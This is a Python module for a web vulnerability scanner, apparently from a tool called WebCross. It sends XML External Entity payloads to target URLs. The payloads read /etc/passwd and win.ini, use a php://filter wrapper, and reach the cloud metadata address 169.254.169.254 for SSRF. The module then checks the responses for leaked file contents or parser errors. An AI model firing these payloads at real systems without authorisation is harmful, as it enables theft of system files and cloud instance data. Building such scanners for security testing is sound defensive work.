"""XXE (XML External Entity) Scanner Module"""

import re
from typing import Any

import requests


class XXEScanner:
    """XML External Entity vulnerability scanner"""

    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "WebCross-Scanner/1.0"

        # XXE payloads
        self.payloads = [
            # Basic file read
            {
                "name": "file_read_unix",
                "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
                "markers": ["root:", "nobody:", "/bin/bash"]
            },
            {
                "name": "file_read_windows",
                "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>''',
                "markers": ["[fonts]", "[extensions]"]
            },
            # Parameter entity
            {
                "name": "parameter_entity",
                "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>''',
                "markers": ["root:", "nobody:"]
            },
            # PHP wrapper
            {
                "name": "php_filter",
                "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',
                "markers": []  # Check for base64
            },
            # SSRF via XXE
            {
                "name": "ssrf_xxe",
                "xml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
                "markers": ["ami-id", "instance-id"]
            },
        ]

        # XXE indicators in response
        self.error_patterns = [
            r"XML parsing error",
            r"SAXParseException",
            r"XMLSyntaxError",
            r"DOMDocument",
            r"SimpleXMLElement",
            r"lxml\.etree",
            r"ENTITY.*SYSTEM",
            r"DOCTYPE",
            r"External.*entity",
        ]

    def _make_request(self, url: str, xml_data: str) -> requests.Response | None:
        try:
            headers = {
                "User-Agent": self.user_agent,
                "Content-Type": "application/xml"
            }
            return requests.post(url, data=xml_data, headers=headers,
                               timeout=self.timeout, verify=False)
        except Exception:
            return None

    def _check_xxe_response(self, response: requests.Response,
                            payload: dict, xml: str) -> dict | None:
        """Check for XXE in response"""
        if not response:
            return None

        content = response.text

        # Check for file content markers
        for marker in payload.get("markers", []):
            if marker in content:
                return {
                    "type": "XXE_FILE_READ",
                    "payload_name": payload["name"],
                    "evidence": f"File content detected: {marker}",
                    "confidence": "HIGH"
                }

        # Check for base64 encoded content (PHP filter)
        if "php://filter" in xml:
            import base64
            try:
                # Look for base64 patterns
                b64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
                matches = re.findall(b64_pattern, content)
                for match in matches:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if "root:" in decoded or "[fonts]" in decoded:
                            return {
                                "type": "XXE_FILE_READ",
                                "payload_name": payload["name"],
                                "evidence": "Base64 encoded file content detected",
                                "confidence": "HIGH"
                            }
                    except Exception:
                        pass
            except Exception:
                pass

        return None

    def _check_xxe_errors(self, response: requests.Response, payload: dict) -> dict | None:
        """Check for XXE-related errors"""
        if not response:
            return None

        content = response.text

        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return {
                    "type": "XXE_ERROR",
                    "payload_name": payload["name"],
                    "evidence": "XML processing error detected",
                    "confidence": "MEDIUM"
                }

        return None

    def scan_url(self, url: str) -> list[dict[str, Any]]:
        """Scan URL for XXE vulnerabilities"""
        findings = []

        # Check if URL accepts XML
        headers_response = requests.head(url, timeout=self.timeout, verify=False)
        headers_response.headers.get('Content-Type', '')

        # Test all payloads
        for payload in self.payloads:
            response = self._make_request(url, payload["xml"])

            # Check for successful exploitation
            result = self._check_xxe_response(response, payload, payload["xml"])
            if result:
                result["url"] = url
                findings.append(result)
                continue

            # Check for errors
            result = self._check_xxe_errors(response, payload)
            if result:
                result["url"] = url
                findings.append(result)

        return findings

    def scan_endpoint(self, url: str) -> list[dict[str, Any]]:
        """Quick scan of endpoint for XML acceptance"""
        findings = []

        # Test if endpoint accepts XML
        test_xml = '<?xml version="1.0"?><test>probe</test>'

        try:
            response = self._make_request(url, test_xml)
            if response and response.status_code in [200, 201, 202]:
                # Endpoint accepts XML, run full scan
                return self.scan_url(url)
        except Exception:
            pass

        return findings
